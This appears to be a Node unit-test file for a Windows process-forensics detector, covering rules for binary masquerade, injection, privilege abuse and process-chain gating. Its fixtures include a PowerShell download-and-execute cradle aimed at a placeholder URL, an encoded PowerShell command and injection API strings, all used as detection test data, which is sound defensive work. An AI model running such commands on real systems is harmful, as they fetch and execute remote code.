// Unit tests for getSusInfo detection rules.
// Loads src/utils/process-inspector.js (and its ESM dep chain) into a vm
// context using the same regex-strip trick as tool-aliases.test.js — no
// build step, no loader hooks, keeps `node --test` pure-CJS.
//
// Covers the rules added in P1–P3 work: pi-46 (path masquerade), pi-47 /
// pi-48 (EID 10 injection / hollowing), pi-49 (parent spoof), pi-50 / pi-51 /
// pi-52 (privilege use). Extend the mkNode helper as new fields enter ctx.

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

function stripModuleSyntax(src) {
  return src
    // Multi-token named import: import { A, B, C } from "..."
    .replace(/^\s*import\s+\{[^}]*\}\s*from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    // Default / namespace import: import X from "..." / import * as X from "..."
    .replace(/^\s*import\s+[\w*\s,{}]+\s+from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    // Side-effect-only import
    .replace(/^\s*import\s+["'][^"']+["']\s*;?\s*$/gm, "")
    // Re-export statements
    .replace(/^\s*export\s+\{[^}]*\}\s*from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    .replace(/^\s*export\s+\*\s+from\s*["'][^"']+["']\s*;?\s*$/gm, "")
    // Named exports → plain locals
    .replace(/^export\s+const\s+/gm, "const ")
    .replace(/^export\s+let\s+/gm, "let ")
    .replace(/^export\s+function\s+/gm, "function ")
    .replace(/^export\s+class\s+/gm, "class ")
    .replace(/^export\s+default\s+/gm, "");
}

function loadProcessInspector() {
  const read = (rel) => fs.readFileSync(path.join(__dirname, "..", rel), "utf8");
  const ctx = {};
  vm.createContext(ctx);
  // Dependency order: tool-aliases → detection-rules → PA constants → process-inspector.
  // After each script, hoist its top-level `const` exports onto the shared
  // global so the next script can reference them. `const` in vm.runInContext
  // stays lexical to that single Script; only globalThis-attached names cross
  // the boundary. Mirrors the pattern in tool-aliases.test.js.
  const hoist = (names) => `\n;Object.assign(globalThis, { ${names.join(", ")} });`;
  vm.runInContext(
    stripModuleSyntax(read("src/detection-rules/tool-aliases.js")) +
      hoist(["TOOL_ENTRIES", "TOOL_BY_ALIAS", "buildCategoryRegex", "lookupTool", "_toolAliasKey"]),
    ctx,
  );
  vm.runInContext(
    stripModuleSyntax(read("src/detection-rules.js")) +
      hoist([
        "CHAIN_RULE_MAP", "SUS_PATHS", "SAFE_PROCS", "ENCODED_PS", "CRED_DUMP_CMD",
        "NTDS_EXTRACT", "LSASS_TOOLS", "ACCOUNT_MANIP", "DEFENSE_EVASION",
        "NETWORK_SCANNERS", "AD_RECON_TOOLS", "RMM_TOOLS", "EXFIL_TOOLS",
        "TUNNEL_TOOLS", "ARCHIVE_SUSPECT",
      ]),
    ctx,
  );
  vm.runInContext(
    stripModuleSyntax(read("src/components/process-analyzer/constants.js")) +
      hoist(["PI_ANALYST_PROFILE_DEFAULT", "PT_ICON_STYLE", "PT_VIEW_MODES"]),
    ctx,
  );
  vm.runInContext(
    stripModuleSyntax(read("src/utils/forensic-normalize.js")) +
      hoist(["normalizeTimestamp", "normalizeHost", "normalizePid", "normalizeGuid", "normalizeLogonId"]),
    ctx,
  );
  vm.runInContext(
    stripModuleSyntax(read("src/utils/process-inspector.js")) +
      hoist(["getSusInfo", "PI_ALL_RULES", "PI_TECHNIQUE_GROUPS", "PI_RULE_GROUPS", "PI_SEV_LABELS", "PI_SEV_COLORS", "_ptFormatDuration"]),
    ctx,
  );
  vm.runInContext(
    stripModuleSyntax(read("src/utils/process-inspector-pipeline.js")) +
      hoist(["buildDetectionMap", "buildPrevalenceModel", "buildPrevalenceSummary", "buildLifetimeAnalysis", "buildTrustAnalysis", "buildChainClusters", "buildSequenceMap", "buildIncidentStories", "consistentParentKey"]),
    ctx,
  );
  return ctx;
}

const pi = loadProcessInspector();
const { getSusInfo, buildDetectionMap, buildPrevalenceSummary, buildLifetimeAnalysis, buildTrustAnalysis, buildChainClusters, buildSequenceMap, buildIncidentStories, consistentParentKey } = pi;

// Canonical node shape — override per-test via spread. Field list mirrors
// getSusInfo's ctx construction so new fields here track new ctx slots.
function mkNode(over = {}) {
  return {
    processName: "",
    cmdLine: "",
    image: "",
    originalFileName: "",
    signed: "",
    signatureStatus: "",
    signer: "",
    company: "",
    hashes: "",
    durationMs: NaN,
    exitCode: "",
    parentImage: "",
    injectionIndicators: null,
    privilegeUse: null,
    ...over,
  };
}

function hasRule(result, ruleId) {
  return !!(result?.evidence || []).find((e) => e.ruleId === ruleId);
}
function ruleLevel(result, ruleId) {
  const e = (result?.evidence || []).find((x) => x.ruleId === ruleId);
  return e ? e.level : null;
}

// ---------- pi-46: system binary path masquerade ----------

test("pi-46 fires when svchost.exe runs from a user-writable path", () => {
  const node = mkNode({ processName: "svchost.exe", image: "C:\\Users\\alice\\AppData\\Local\\svchost.exe" });
  const r = getSusInfo(node, null);
  assert.ok(hasRule(r, "pi-46"), "must flag svchost outside System32");
  assert.equal(ruleLevel(r, "pi-46"), 3);
});

test("pi-46 stays silent on svchost.exe running from System32", () => {
  const node = mkNode({ processName: "svchost.exe", image: "C:\\Windows\\System32\\svchost.exe" });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-46"), false);
});

test("pi-46 skips when image path is missing (dataset lacks it)", () => {
  const node = mkNode({ processName: "svchost.exe", image: "" });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-46"), false, "missing path must not false-positive");
});

test("pi-46 ignores processes that aren't in the critical system-binary list", () => {
  const node = mkNode({ processName: "notepad.exe", image: "C:\\Users\\alice\\notepad.exe" });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-46"), false);
});

// ---------- pi-47 / pi-48: EID 10 injection / hollowing ----------

test("pi-47 fires at level 2 for a single suspicious access event", () => {
  const node = mkNode({ processName: "lsass.exe", image: "C:\\Windows\\System32\\lsass.exe",
    injectionIndicators: { suspiciousAccessCount: 1, accessCount: 1, hollowingLikely: false } });
  const r = getSusInfo(node, null);
  assert.ok(hasRule(r, "pi-47"));
  assert.equal(ruleLevel(r, "pi-47"), 2);
});

test("pi-47 upgrades to level 3 when suspiciousAccessCount >= 2", () => {
  const node = mkNode({ processName: "lsass.exe", image: "C:\\Windows\\System32\\lsass.exe",
    injectionIndicators: { suspiciousAccessCount: 3, accessCount: 5, hollowingLikely: false } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-47"), 3);
});

test("pi-47 stays silent when only benign access events are recorded", () => {
  const node = mkNode({ processName: "lsass.exe", image: "C:\\Windows\\System32\\lsass.exe",
    injectionIndicators: { suspiciousAccessCount: 0, accessCount: 2, hollowingLikely: false } });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-47"), false);
});

test("pi-48 fires when hollowingLikely is set", () => {
  const node = mkNode({ processName: "notepad.exe", image: "C:\\Windows\\notepad.exe",
    injectionIndicators: { suspiciousAccessCount: 1, accessCount: 1, hollowingLikely: true } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-48"), 3);
});

// ---------- pi-49: parent link disagreement (audit P5) ----------
//
// This rule used to be "Parent PID Spoofing" and went critical whenever a child's
// reported ParentImage named a trusted binary the linked parent did not match.
// That is backwards: real PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
// makes the reported and actual parent AGREE, because the OS records the spoofed
// parent in both. A disagreement means the tree relinked onto a recycled PID — a
// reconstruction defect. It is now a link-quality warning.

test("pi-49 does not report a PID-relinked mismatch as an attack", () => {
  const node = mkNode({
    processName: "evil.exe", image: "C:\\Tools\\evil.exe",
    parentImage: "C:\\Windows\\System32\\svchost.exe",
    linkSource: "pid-host", linkConfidence: "low",
  });
  const parentNode = { processName: "malware.exe", image: "C:\\Malware\\malware.exe", signer: "" };
  const r = getSusInfo(node, parentNode);
  assert.ok(hasRule(r, "pi-49"), "the disagreement is still surfaced");
  assert.equal(ruleLevel(r, "pi-49"), 0, "as context — a mislinked branch, not a spoof");
});

test("pi-49 is low (not silent) when the link was a 1:1 GUID join", () => {
  // A GUID link is an identity join, so the two fields genuinely disagree rather
  // than the link being suspect.
  const node = mkNode({
    processName: "child.exe", image: "C:\\Tools\\child.exe",
    parentImage: "C:\\Windows\\System32\\svchost.exe",
    linkSource: "guid", linkConfidence: "high",
  });
  const parentNode = { processName: "services.exe", image: "C:\\Windows\\System32\\services.exe", signer: "Microsoft Windows" };
  const r = getSusInfo(node, parentNode);
  assert.ok(hasRule(r, "pi-49"));
  assert.equal(ruleLevel(r, "pi-49"), 1);
});

test("pi-49 never reaches high or critical on its own", () => {
  // The old rule promoted to critical whenever the reported parent was a Microsoft
  // binary and the linked parent was unsigned — i.e. on every PID-reuse mislink
  // involving a system binary, which is the common case on a busy host.
  for (const linkSource of ["guid", "pid-host", "pid-logon", ""]) {
    const node = mkNode({
      processName: "evil.exe", image: "C:\\Tools\\evil.exe",
      parentImage: "C:\\Windows\\explorer.exe", linkSource,
    });
    const r = getSusInfo(node, { processName: "unknown.exe", image: "C:\\X\\unknown.exe", signer: "" });
    assert.ok(ruleLevel(r, "pi-49") <= 1, `pi-49 must stay <= low, got ${ruleLevel(r, "pi-49")} for linkSource=${linkSource}`);
  }
});

test("pi-49 stays silent when reported parent matches linked parent", () => {
  const node = mkNode({
    processName: "child.exe", image: "C:\\Tools\\child.exe",
    parentImage: "C:\\Windows\\explorer.exe",
  });
  const parentNode = { processName: "explorer.exe", image: "C:\\Windows\\explorer.exe" };
  const r = getSusInfo(node, parentNode);
  assert.equal(hasRule(r, "pi-49"), false);
});

test("pi-49 skips when reported parentImage is missing (backfilled case)", () => {
  const node = mkNode({
    processName: "child.exe", image: "C:\\Tools\\child.exe",
    parentImage: "", // row lacked it — backend will backfill, but pre-backfill this is empty
  });
  const parentNode = { processName: "explorer.exe", image: "C:\\Windows\\explorer.exe" };
  const r = getSusInfo(node, parentNode);
  assert.equal(hasRule(r, "pi-49"), false);
});

test("pi-49 is context when neither parent name is a trusted binary", () => {
  // Nothing about "the reported parent is not a Microsoft binary" makes a link
  // disagreement more likely to be an attack; it is the same mislink either way.
  const node = mkNode({
    processName: "evil.exe", image: "C:\\Tools\\evil.exe",
    parentImage: "C:\\Tools\\stager.exe", linkSource: "pid-host",
  });
  const parentNode = { processName: "other.exe", image: "C:\\Tools\\other.exe" };
  const r = getSusInfo(node, parentNode);
  assert.ok(hasRule(r, "pi-49"));
  assert.equal(ruleLevel(r, "pi-49"), 0);
});

// ---------- pi-50 / pi-51 / pi-52: privilege use ----------

test("pi-50 fires at level 2 on SeDebugPrivilege alone", () => {
  const node = mkNode({ processName: "tool.exe", image: "C:\\tool.exe",
    privilegeUse: { eventCount: 1, privileges: { sedebugprivilege: 1 }, highRiskCount: 1, uniqueHighRisk: 1, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-50"), 2);
});

test("pi-50 upgrades to level 3 when SeDebug is paired with EID 10 injection indicators", () => {
  const node = mkNode({ processName: "tool.exe", image: "C:\\tool.exe",
    injectionIndicators: { suspiciousAccessCount: 1, accessCount: 1, hollowingLikely: false },
    privilegeUse: { eventCount: 1, privileges: { sedebugprivilege: 1 }, highRiskCount: 1, uniqueHighRisk: 1, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-50"), 3);
});

test("pi-50 upgrades to level 3 when SeDebug is paired with a PowerShell injection cmdline", () => {
  const node = mkNode({ processName: "powershell.exe", image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    cmdLine: "powershell -c VirtualAlloc + WriteProcessMemory",
    privilegeUse: { eventCount: 1, privileges: { sedebugprivilege: 1 }, highRiskCount: 1, uniqueHighRisk: 1, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-50"), 3);
});

test("pi-51 fires at level 3 on any SeLoadDriverPrivilege invocation", () => {
  const node = mkNode({ processName: "loader.exe", image: "C:\\Tools\\loader.exe",
    privilegeUse: { eventCount: 1, privileges: { seloaddriverprivilege: 1 }, highRiskCount: 1, uniqueHighRisk: 1, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-51"), 3);
});

test("pi-52 fires at level 3 when 3+ distinct high-risk privileges are concentrated on one process", () => {
  const node = mkNode({ processName: "rootkit.exe", image: "C:\\Tools\\rootkit.exe",
    privilegeUse: { eventCount: 5, privileges: { sedebugprivilege: 1, seloaddriverprivilege: 1, setcbprivilege: 1 },
      highRiskCount: 3, uniqueHighRisk: 3, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(ruleLevel(r, "pi-52"), 3);
});

test("pi-52 stays silent when fewer than 3 distinct high-risk privileges", () => {
  const node = mkNode({ processName: "svc.exe", image: "C:\\Windows\\System32\\svc.exe",
    privilegeUse: { eventCount: 2, privileges: { sedebugprivilege: 2 }, highRiskCount: 2, uniqueHighRisk: 1, services: [] } });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-52"), false);
});

test("privilege rules all stay silent when privilegeUse is null", () => {
  const node = mkNode({ processName: "benign.exe", image: "C:\\Windows\\benign.exe" });
  const r = getSusInfo(node, null);
  assert.equal(hasRule(r, "pi-50"), false);
  assert.equal(hasRule(r, "pi-51"), false);
  assert.equal(hasRule(r, "pi-52"), false);
});

// ---------- chain-layer FP gate (pi-1 / pi-2) ----------

function ruleCat(result, ruleId) {
  const e = (result?.evidence || []).find((x) => x.ruleId === ruleId);
  return e ? e.cat : null;
}

test("chain gate: svchost->powershell with a benign cmdline is demoted to context (level 0)", () => {
  const node = mkNode({ processName: "powershell.exe", cmdLine: "powershell.exe -Command Get-ChildItem C:\\Logs" });
  const r = getSusInfo(node, { processName: "svchost.exe" });
  assert.ok(hasRule(r, "pi-2"), "chain still recorded");
  assert.equal(ruleCat(r, "pi-2"), "context", "benign service-host chain must be context, not a primary chain finding");
  assert.equal(ruleLevel(r, "pi-2"), 0);
});

test("chain gate: svchost->powershell WITH encoded cmdline keeps full chain severity", () => {
  const node = mkNode({ processName: "powershell.exe", cmdLine: "powershell.exe -enc SQBFAFgA" });
  const r = getSusInfo(node, { processName: "svchost.exe" });
  assert.equal(ruleCat(r, "pi-2"), "chain", "corroborated chain stays primary");
  assert.ok(ruleLevel(r, "pi-2") >= 2, "encoded svchost->ps must keep high severity");
});

test("chain gate: cmd->powershell (interpreter chain) with download cradle stays primary", () => {
  const node = mkNode({ processName: "powershell.exe", cmdLine: "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')" });
  const r = getSusInfo(node, { processName: "cmd.exe" });
  assert.equal(ruleCat(r, "pi-1"), "chain");
});

test("chain gate: benign cmd->powershell is demoted to context", () => {
  const node = mkNode({ processName: "powershell.exe", cmdLine: "powershell.exe -File C:\\Scripts\\inventory.ps1" });
  const r = getSusInfo(node, { processName: "cmd.exe" });
  assert.equal(ruleCat(r, "pi-1"), "context", "benign interpreter chain must not score as primary");
  assert.equal(ruleLevel(r, "pi-1"), 0);
});

test("chain gate does NOT touch Office->shell (pi-0) — always primary, even benign cmdline", () => {
  const node = mkNode({ processName: "powershell.exe", cmdLine: "powershell.exe -Command Write-Host hi" });
  const r = getSusInfo(node, { processName: "winword.exe" });
  assert.equal(ruleCat(r, "pi-0"), "chain", "Office macro chains are always high-signal");
  assert.ok(ruleLevel(r, "pi-0") >= 2);
});

test("chain gate: a lone discovery command (cmd->whoami) is demoted to context", () => {
  const node = mkNode({ processName: "whoami.exe", cmdLine: "whoami /all" });
  const r = getSusInfo(node, { processName: "cmd.exe" });
  // cmd->whoami is a pi-18 chain; the discovery-singleton gate demotes it to context.
  const chainEv = (r.evidence || []).find((e) => e.beh === "shell-exec" || e.ruleId === "pi-18" || e.ruleId === "pi-1");
  if (chainEv) assert.equal(chainEv.cat, "context", "lone discovery command must not score as a primary chain");
});

// ---------- trust / path / exfil FP calibration ----------

test("pi-36: expired signature is demoted to context; revoked stays high", () => {
  const exp = getSusInfo(mkNode({ processName: "oldtool.exe", image: "C:\\Program Files\\Old\\oldtool.exe", signatureStatus: "expired" }), null);
  assert.equal(ruleCat(exp, "pi-36"), "context");
  assert.equal(ruleLevel(exp, "pi-36"), 0);
  const rev = getSusInfo(mkNode({ processName: "x.exe", image: "C:\\Program Files\\X\\x.exe", signatureStatus: "revoked" }), null);
  assert.equal(ruleLevel(rev, "pi-36"), 2);
});

test("pi-37: signer mismatch fires for a core OS binary but NOT a third-party app", () => {
  const svc = getSusInfo(mkNode({ processName: "svchost.exe", image: "C:\\Windows\\System32\\svchost.exe", signer: "Acme Corporation", signatureStatus: "valid" }), null);
  assert.ok(hasRule(svc, "pi-37"), "svchost with a non-Microsoft signer is a masquerade signal");
  const chrome = getSusInfo(mkNode({ processName: "chrome.exe", image: "C:\\Program Files\\Google\\Chrome\\chrome.exe", signer: "Acme Corporation", signatureStatus: "valid" }), null);
  assert.equal(hasRule(chrome, "pi-37"), false, "3rd-party app carries its own publisher — not a finding");
});

test("pi-13: FileZilla in Program Files is context; rclone stays high", () => {
  const fz = getSusInfo(mkNode({ processName: "filezilla.exe", image: "C:\\Program Files\\FileZilla\\filezilla.exe" }), { processName: "explorer.exe" });
  assert.equal(ruleCat(fz, "pi-13"), "context", "dual-use SFTP client must not be a standalone HIGH");
  const rc = getSusInfo(mkNode({ processName: "rclone.exe", image: "C:\\Program Files\\rclone\\rclone.exe" }), { processName: "explorer.exe" });
  assert.equal(ruleLevel(rc, "pi-13"), 2, "rclone stays high");
});

test("pi-16: validly-signed binary in Temp is not flagged; unsigned still is", () => {
  const signed = getSusInfo(mkNode({ processName: "setup.exe", image: "c:\\users\\a\\appdata\\local\\temp\\setup.exe", signed: "true", signatureStatus: "valid" }), null);
  assert.equal(hasRule(signed, "pi-16"), false, "signed updater in Temp is benign");
  const unsigned = getSusInfo(mkNode({ processName: "evil.exe", image: "c:\\users\\a\\appdata\\local\\temp\\evil.exe", signed: "false" }), null);
  assert.ok(hasRule(unsigned, "pi-16"), "unsigned EXE from a staging dir still flagged");
});

test("context stacking: a context-only node does not accrete generic context pills", () => {
  const r = getSusInfo(mkNode({ processName: "evil.exe", image: "c:\\users\\a\\appdata\\local\\temp\\evil.exe", signed: "false" }), null);
  assert.ok(hasRule(r, "pi-16"), "pi-16 (context) fires");
  const stacked = (r.evidence || []).some((e) => e.reason === "User-writable path");
  assert.equal(stacked, false, "no PRIMARY finding → must not stack a redundant User-writable pill");
});

// ---------- dataset prevalence scoring ----------

function mkProc(key, over = {}) {
  return {
    key,
    parentKey: "",
    processName: "",
    parentProcessName: "explorer.exe",
    image: "",
    cmdLine: "",
    user: "HOST\\user",
    hostname: "HOST-A",
    ts: "2026-03-15 10:00:00",
    ...over,
  };
}

test("Process Inspector prevalence scoring boosts rare suspicious processes over repeated commodity hits", () => {
  const processes = [];
  for (let i = 0; i < 10; i++) {
    processes.push(mkProc(`common-${i}`, {
      processName: "commonproc.exe",
      image: "C:\\Tools\\commonproc.exe",
      cmdLine: "commonproc.exe --standard-task",
      ts: `2026-03-15 10:00:${String(i).padStart(2, "0")}`,
    }));
  }
  for (let i = 0; i < 9; i++) {
    processes.push(mkProc(`benign-${i}`, {
      processName: "notepad.exe",
      image: "C:\\Windows\\System32\\notepad.exe",
      cmdLine: "notepad.exe",
      ts: `2026-03-15 10:01:${String(i).padStart(2, "0")}`,
    }));
  }
  processes.push(mkProc("rare-1", {
    processName: "rareproc.exe",
    image: "C:\\Users\\Public\\rareproc.exe",
    cmdLine: "rareproc.exe --one-off",
    ts: "2026-03-15 10:02:00",
  }));
  const data = { processes };
  const detMap = buildDetectionMap(data, {
    customRules: [{ name: "test suspicious tool", pattern: "commonproc|rareproc", severity: "high" }],
  });
  const common = detMap.get("common-0");
  const rare = detMap.get("rare-1");
  assert.equal(common.level, 2);
  assert.equal(rare.level, 2);
  assert.equal(rare.prevalence.rarity, "rare");
  assert.ok(rare.prevalence.signals.some((s) => s.includes("rare process name")));
  assert.ok(rare.triageScore > common.triageScore, "rare process should rank above repeated same-severity hits");
});

test("Process Inspector clusters sort rare high-signal activity above repeated same-severity clusters", () => {
  const processes = [];
  for (let i = 0; i < 10; i++) {
    processes.push(mkProc(`common-${i}`, {
      processName: "commonproc.exe",
      image: "C:\\Tools\\commonproc.exe",
      cmdLine: "commonproc.exe --standard-task",
      ts: `2026-03-15 10:00:${String(i).padStart(2, "0")}`,
    }));
  }
  processes.push(mkProc("rare-1", {
    processName: "rareproc.exe",
    image: "C:\\Users\\Public\\rareproc.exe",
    cmdLine: "rareproc.exe --one-off",
    ts: "2026-03-15 10:02:00",
  }));
  const data = { processes };
  const detMap = buildDetectionMap(data, {
    customRules: [{ name: "test suspicious tool", pattern: "commonproc|rareproc", severity: "high" }],
  });
  const clusters = buildChainClusters(data, detMap, buildSequenceMap(data, detMap));
  assert.equal(clusters[0].dominantChild, "rareproc.exe");
  assert.ok(clusters[0].prevalenceSignals.length > 0);
  assert.ok((clusters[0].maxTriageScore || 0) > (clusters[1].maxTriageScore || 0));
});

test("Process Inspector prevalence summary ranks rare detected processes with analyst context", () => {
  const processes = [];
  for (let i = 0; i < 8; i++) {
    processes.push(mkProc(`common-${i}`, {
      hostname: i % 2 ? "HOST-B" : "HOST-A",
      processName: "commonproc.exe",
      image: "C:\\Tools\\commonproc.exe",
      cmdLine: "commonproc.exe --standard-task",
      ts: `2026-03-15 10:00:${String(i).padStart(2, "0")}`,
    }));
  }
  processes.push(mkProc("rare-1", {
    hostname: "HOST-C",
    user: "HOST-C\\svc",
    processName: "rareproc.exe",
    image: "C:\\Users\\Public\\rareproc.exe",
    cmdLine: "rareproc.exe --one-off C:\\Users\\Public\\payload.dat",
    ts: "2026-03-15 10:02:00",
  }));
  const data = { processes };
  const detMap = buildDetectionMap(data, {
    customRules: [{ name: "test suspicious tool", pattern: "rareproc", severity: "high" }],
  });
  const summary = buildPrevalenceSummary(data, detMap);
  assert.equal(summary.stats.rare, 1);
  assert.equal(summary.stats.rareDetected, 1);
  assert.equal(summary.items[0].processName, "rareproc.exe");
  assert.equal(summary.items[0].rarity, "rare");
  assert.equal(summary.items[0].hosts[0], "HOST-C");
  assert.ok(summary.items[0].signals.some((s) => s.includes("rare process name")));
  assert.ok(summary.items[0].detectionReasons.some((reason) => reason.includes("test suspicious tool")));
});

// Beacon-like respawn cadence (pi-54) was removed as too FP-prone — regular process
// churn (scheduled tasks, watchdogs, polling services) is overwhelmingly benign, and a
// stable inter-spawn interval is not evidence of malice without network corroboration.
// Evenly-spaced spawns that are NOT short-lived and NOT service-parented now produce no
// lifetime finding at all.
test("Process Inspector no longer flags evenly-spaced respawns as a cadence beacon", () => {
  const base = Date.parse("2026-03-15T10:00:00Z");
  const processes = [0, 60000, 120000, 180000].map((offset, i) => mkProc(`cadence-${i}`, {
    processName: "rarebeacon.exe",
    image: "C:\\ProgramData\\rarebeacon.exe",
    cmdLine: "rarebeacon.exe --poll",
    ts: new Date(base + offset).toISOString(),
    tsMs: base + offset,
  }));
  const lifeMap = buildLifetimeAnalysis({ processes });
  for (const v of lifeMap.values()) assert.notEqual(v.type, "beacon", "beacon cadence must no longer be produced");
  const detMap = buildDetectionMap({ processes });
  const det = detMap.get("cadence-0");
  assert.ok(!det || (det.reason !== "Beacon-like process respawn cadence" && det.lifetime?.type !== "beacon"));
});

test("Process Inspector lifetime scoring can be disabled by lifetime rule id", () => {
  const base = Date.parse("2026-03-15T10:00:00Z");
  // Short writable-path respawns (pi-53) — disabling the rule id suppresses the finding.
  const offsets = [0, 7000, 31000, 430000];
  const processes = offsets.map((offset, i) => mkProc(`respawn-disabled-${i}`, {
    processName: "retrydropper.exe",
    image: "C:\\Users\\Public\\retrydropper.exe",
    cmdLine: "retrydropper.exe",
    ts: new Date(base + offset).toISOString(),
    tsMs: base + offset,
    durationMs: 1000,
  }));
  const detMap = buildDetectionMap({ processes }, { disabledRules: new Set(["pi-53"]) });
  const det = detMap.get("respawn-disabled-0");
  assert.ok(!det || det.lifetime?.type !== "short-respawn", "disabled pi-53 must not surface short-respawn");
});

test("Process Inspector lifetime scoring promotes short writable-path respawns", () => {
  const base = Date.parse("2026-03-15T10:00:00Z");
  const offsets = [0, 7000, 31000, 430000];
  const processes = offsets.map((offset, i) => mkProc(`short-${i}`, {
    processName: "retrydropper.exe",
    image: "C:\\Users\\Public\\retrydropper.exe",
    cmdLine: "retrydropper.exe",
    ts: new Date(base + offset).toISOString(),
    tsMs: base + offset,
    durationMs: 1000,
  }));
  const detMap = buildDetectionMap({ processes });
  const det = detMap.get("short-0");
  assert.equal(det.level, 2);
  assert.equal(det.reason, "Repeated short-lived process respawns");
  assert.equal(det.lifetime.type, "short-respawn");
  assert.ok(det.evidence.some((e) => e.ruleId === "pi-53"));
});

// ---------- binary trust scoring ----------

test("Process Inspector trust scoring flags same image path with different hashes across hosts", () => {
  const processes = [
    mkProc("hash-a", {
      hostname: "HOST-A",
      processName: "agent.exe",
      image: "C:\\Program Files\\Vendor\\agent.exe",
      cmdLine: "agent.exe",
      hashes: `SHA256=${"a".repeat(64)}`,
    }),
    mkProc("hash-b", {
      hostname: "HOST-B",
      processName: "agent.exe",
      image: "C:\\Program Files\\Vendor\\agent.exe",
      cmdLine: "agent.exe",
      hashes: `SHA256=${"b".repeat(64)}`,
    }),
  ];
  const trustMap = buildTrustAnalysis({ processes });
  const detMap = buildDetectionMap({ processes });
  const det = detMap.get("hash-a");
  assert.equal(trustMap.get("hash-a").type, "cross-host-hash-mismatch");
  assert.equal(det.level, 3);
  assert.equal(det.reason, "Cross-host hash mismatch for same image path");
  assert.equal(det.trust.hashCount, 2);
  assert.ok(det.evidence.some((e) => e.ruleId === "pi-56"));
});

test("Process Inspector trust scoring flags same process name from rare writable path", () => {
  const processes = [
    mkProc("normal-1", { processName: "updater.exe", image: "C:\\Program Files\\Vendor\\updater.exe", cmdLine: "updater.exe" }),
    mkProc("normal-2", { processName: "updater.exe", image: "C:\\Program Files\\Vendor\\updater.exe", cmdLine: "updater.exe" }),
    mkProc("normal-3", { processName: "updater.exe", image: "C:\\Program Files\\Vendor\\updater.exe", cmdLine: "updater.exe" }),
    mkProc("rare-path", { processName: "updater.exe", image: "C:\\Users\\Public\\updater.exe", cmdLine: "updater.exe" }),
  ];
  const detMap = buildDetectionMap({ processes });
  const det = detMap.get("rare-path");
  assert.equal(det.level, 2);
  assert.equal(det.reason, "Same process name from unusual path");
  assert.equal(det.trust.type, "same-name-unusual-path");
  assert.ok(det.evidence.some((e) => e.ruleId === "pi-57"));
});

test("Process Inspector baselines Cortex XDR protected payloads under the trusted Cyvera root", () => {
  const cortexPath = "C:\\ProgramData\\Cyvera\\LocalSystem\\Download\\protected_payload_execution\\cortex-xdr-payload.exe";
  const direct = getSusInfo(mkNode({
    processName: "cortex-xdr-payload.exe",
    image: cortexPath,
    cmdLine: "cortex-xdr-payload.exe --config network",
  }), null);
  assert.equal(direct.level, 0);
  assert.equal(direct.sanctioned?.cat, "edr");
  assert.equal(direct.sanctioned?.match, "path");

  // The Cyvera instance is deliberately rare among same-named processes. The
  // cross-row trust pass may record that context, but must not promote pi-57.
  const processes = [
    mkProc("cortex-pf-1", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-pf-2", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-pf-3", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-cyvera", {
      processName: "cortex-xdr-payload.exe",
      image: cortexPath,
      cmdLine: "cortex-xdr-payload.exe --config network",
    }),
  ];
  const det = buildDetectionMap({ processes }).get("cortex-cyvera");
  assert.equal(det.level, 0);
  assert.equal(hasRule(det, "pi-57"), false);
  assert.equal(det.trust?.type, "same-name-unusual-path");
  assert.equal(det.trust?.suppressed, true);
  assert.equal(det.prevalence?.rarity, "baseline");
  assert.equal(det.prevalence?.suppressed, true);
  assert.equal(det.prevalence?.signals?.length, 0);

  const prevalenceSummary = buildPrevalenceSummary({ processes }, buildDetectionMap({ processes }));
  assert.equal(
    prevalenceSummary.items.some((item) => item.keys.includes("cortex-cyvera")),
    false,
    "clean sanctioned EDR rows must not surface in the rare-process strip",
  );
});

test("Process Inspector still flags a same-named Cortex binary outside sanctioned vendor paths", () => {
  const processes = [
    mkProc("cortex-normal-1", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-normal-2", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-normal-3", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Program Files\\Palo Alto Networks\\Traps\\cortex-xdr-payload.exe",
    }),
    mkProc("cortex-copy", {
      processName: "cortex-xdr-payload.exe",
      image: "C:\\Users\\Public\\cortex-xdr-payload.exe",
    }),
  ];
  const det = buildDetectionMap({ processes }).get("cortex-copy");
  assert.ok(det.level >= 2);
  assert.equal(det.sanctioned, null);
  assert.ok(hasRule(det, "pi-57"));
});

test("Process Inspector trust rules flag unsigned binaries in trusted paths", () => {
  const node = mkNode({
    processName: "vendor.exe",
    image: "C:\\Program Files\\Vendor\\vendor.exe",
    signed: "false",
  });
  const det = getSusInfo(node, null);
  assert.equal(det.reason, "Unsigned binary in trusted path");
  assert.ok(hasRule(det, "pi-35"));
});

